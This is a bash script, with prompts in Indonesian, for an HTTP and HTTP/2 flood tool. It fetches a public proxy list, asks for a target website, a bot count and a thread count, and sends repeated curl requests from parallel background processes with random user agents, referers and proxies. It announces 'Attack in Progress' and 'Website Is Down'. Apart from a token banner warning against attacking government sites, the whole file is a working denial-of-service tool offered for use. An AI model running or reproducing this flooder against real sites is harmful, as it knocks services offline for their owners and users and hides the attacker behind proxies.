#!/bin/bash
## naix0x create the game

# Check if figlet is installed, if not, install it
if ! command -v figlet &> /dev/null; then
    echo "Installing figlet..."
    sudo apt-get update
    sudo apt-get install -y figlet
fi

# Check if bc is installed, if not, install it
if ! command -v bc &> /dev/null; then
    echo "Installing bc..."
    sudo apt-get update
    sudo apt-get install -y bc
fi
rm proxy.txt
curl https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt -o proxy.txt
clear

ip=""
max=""
delay=""
threads=""
protocol=""
proxy=""
use_proxy=true
proxy_file="proxy.txt"
inactive_proxies=()

# Function to print colorful text
color_echo() {
    echo -e "\e[1;34m$1\e[0m"
}

# Function to ask the user whether to use a proxy or not
ask_use_proxy() {
    read -p "Apakah Anda ingin menggunakan proxy? (y/n): " use_proxy_choice
    case $use_proxy_choice in
        [yY]) use_proxy=true;;
        [nN]) use_proxy=false;;
        *) color_echo "Pilihan tidak valid. Defaultnya adalah tidak menggunakan proxy." && use_proxy=false;;
    esac
}

# Function to set proxy based on user input or random selection from proxy file
set_proxy() {
    if $use_proxy; then
        if [ -f "$proxy_file" ]; then
            proxies=($(cat "$proxy_file"))
            if [ ${#proxies[@]} -eq 0 ]; then
                color_echo "Tidak ada proxy yang tersedia. Berjalan tanpa proxy."
                use_proxy=false
            else
                proxy=$(shuf -n 1 "$proxy_file")
            fi
        else
            color_echo "File proksi tidak ditemukan. Berjalan tanpa proxy."
            use_proxy=false
        fi
    fi
}

# Print a colorful banner
color_echo "$(figlet -f slant " http - flood ")"

# Display protocol selection table
color_echo "+----+------------+"
color_echo "| No | Protocol   | ⚠️ WARMING ⚠️"
color_echo "+----+------------+"
color_echo "| 1  | HTTP       | 📢 Jangan Serang Situs go.id"
color_echo "| 2  | HTTP/2     | 📢 Tools ini dibuat untuk Testing!!!"
color_echo "+----+------------+"
echo ""
echo -e "\033[0m Version 8.7 | Dev By Ro0TN3T"
echo ""
read -p "Masukkan nomor yang sesuai dengan pilihan Anda: " protocol_choice

# Set protocol based on user choice
case $protocol_choice in
    1) protocol="http";;
    2) protocol="https";;
    *) color_echo "Pilihan tidak valid. Defaultnya ke HTTP." && protocol="http";;
esac

# Prompt for attack details
color_echo "Masukkan Detail Serangan untuk $protocol"
color_echo "---------------------------------"
echo "ex : target.com or ip address"
echo "---------------------------------"
read -p "Target Web : " ip
read -p "Jumlah Bot: " max
read -p "Penundaan (milidetik, minimum 10 ms) : " delay
read -p "Jumlah Thread " threads
echo ""

# Ensure minimum delay is 10 milliseconds
if [ "$delay" -lt 10 ]; then
    delay=10
fi

# Ensure minimum thread is 1
if [ "$threads" -lt 1 ]; then
    threads=1
fi

# In the main part of the script, call the functions to ask and set proxy
ask_use_proxy
set_proxy

# Function to get HTTP status description based on the status code
get_status_description() {
    case "$1" in
        100) echo "Continue";;
        101) echo "Switching Protocols";;
        200) echo "$(tput setaf 2)OK$(tput sgr0)";;
        201) echo "Created";;
        202) echo "Accepted";;
        203) echo "Non-Authoritative Information";;
        204) echo "No Content";;
        205) echo "Reset Content";;
        206) echo "Partial Content";;
        300) echo "Multiple Choices";;
        301) echo "Moved Permanently";;
        302) echo "Found";;
        303) echo "See Other";;
        304) echo "Not Modified";;
        305) echo "Use Proxy";;
        307) echo "Temporary Redirect";;
        400) echo "Bad Request";;
        401) echo "Unauthorized";;
        402) echo "Payment Required";;
        403) echo "Forbidden";;
        404) echo "Not Found";;
        405) echo "Method Not Allowed";;
        406) echo "Not Acceptable";;
        407) echo "Proxy Authentication Required";;
        408) echo "Request Timeout";;
        409) echo "Conflict";;
        410) echo "Gone";;
        411) echo "Length Required";;
        412) echo "Precondition Failed";;
        413) echo "Request Entity Too Large";;
        414) echo "Request-URI Too Long";;
        415) echo "Unsupported Media Type";;
        416) echo "Requested Range Not Satisfiable";;
        417) echo "Expectation Failed";;
        500) echo "Internal Server Error";;
        501) echo "Not Implemented";;
        502) echo "Bad Gateway";;
        503) echo "$(tput setaf 1)Service Unavailable$(tput sgr0)";;
        504) echo "Gateway Timeout";;
        505) echo "HTTP Version Not Supported";;
        *) echo "Unknown Status Code";;
    esac
}

# Function to send HTTP flood using curl with random user-agent and referer, displaying HTTP status code and message
send_traffic_http() {
    for ((i=1; i<=max; i++))
    do
      (for ((j=1; j<=threads; j++)); do
        user_agent=$(shuf -n 1 user-agents.txt)
        referer=$(shuf -n 1 referers.txt)
        
        if $use_proxy; then
          if curl -s -L -A "$user_agent" -e "$referer" -x "$proxy" -o /dev/null --connect-timeout 1 "$protocol://$ip"; then
            http_code=$(curl -s -L -A "$user_agent" -e "$referer" -x "$proxy" -o /dev/null -w '%{http_code}\n' "$protocol://$ip")
          else
            color_echo "Proxy $proxy is not active. Falling back to non-proxy mode."
            inactive_proxies+=("$proxy")  # Add inactive proxy to the list
            proxy=""  # Clear proxy variable to switch to non-proxy mode
            http_code=$(curl -s -L -A "$user_agent" -e "$referer" -o /dev/null -w '%{http_code}\n' "$protocol://$ip")
          fi
        else
          http_code=$(curl -s -L -A "$user_agent" -e "$referer" -o /dev/null -w '%{http_code}\n' "$protocol://$ip")
        fi

        http_description=$(get_status_description "$http_code")
        color_echo "[$i:$j] HTTP Status Code: $http_code - $http_description"
      done) &
      #"$(echo "$delay/1000" | bc -l)"
      sleep 0.1
      echo -e '\033[35m  Website Is Down Target : '"$ip"
    done
}

# Function to send HTTP/2 flood using curl, displaying HTTP status code and message
send_traffic_http2() {
    for ((i=1; i<=max; i++))
    do
      (for ((j=1; j<=threads; j++)); do
        user_agent=$(shuf -n 1 user-agents.txt)
        referer=$(shuf -n 1 referers.txt)

        if $use_proxy; then
          if curl -s -o /dev/null --connect-timeout 5 -w "%{http_code}" -L -H "Host: $ip" -H "Referer: $referer" -A "$user_agent" -x "$proxy" --http2 "$protocol://$ip"; then
            http_code=$(curl -s -o /dev/null -w '%{http_code}\n' -L -H "Host: $ip" -H "Referer: $referer" -A "$user_agent" -x "$proxy" --http2 "$protocol://$ip")
          else
            color_echo "Proxy $proxy is not active. Falling back to non-proxy mode."
            inactive_proxies+=("$proxy")  # Add inactive proxy to the list
            proxy=""  # Clear proxy variable to switch to non-proxy mode
            http_code=$(curl -s -o /dev/null -w '%{http_code}\n' -L -H "Host: $ip" -H "Referer: $referer" -A "$user_agent" --http2 "$protocol://$ip")
          fi
        else
          http_code=$(curl -s -o /dev/null -w '%{http_code}\n' -L -H "Host: $ip" -H "Referer: $referer" -A "$user_agent" --http2 "$protocol://$ip")
        fi

        http_description=$(get_status_description "$http_code")
        color_echo "[$i:$j] HTTP/2 Status Code: $http_code - $http_description"
      done) &
     # sleep "$(echo "$delay/1000" | bc -l)"
     sleep 0.1
      echo -e '\033[35m  Website Is Down Target : '"$ip"
    done
}

# Add a colorful background and lines
color_echo "======================================"
color_echo "            Attack in Progress         "
color_echo "======================================"

# Send HTTP traffic (choose either HTTP or HTTP/2)
case $protocol in
    "http") send_traffic_http;;
    "https") send_traffic_http2;;
esac

# Wait for all background processes to finish
wait

# Print a colorful "FINISHED" message
color_echo "FINISHED"

# At the end of the script, add a section to display inactive proxies
color_echo "Inactive Proxies: $proxy"
for inactive_proxy in "${inactive_proxies[@]}"; do
    color_echo "- $inactive_proxy"
done
exit 0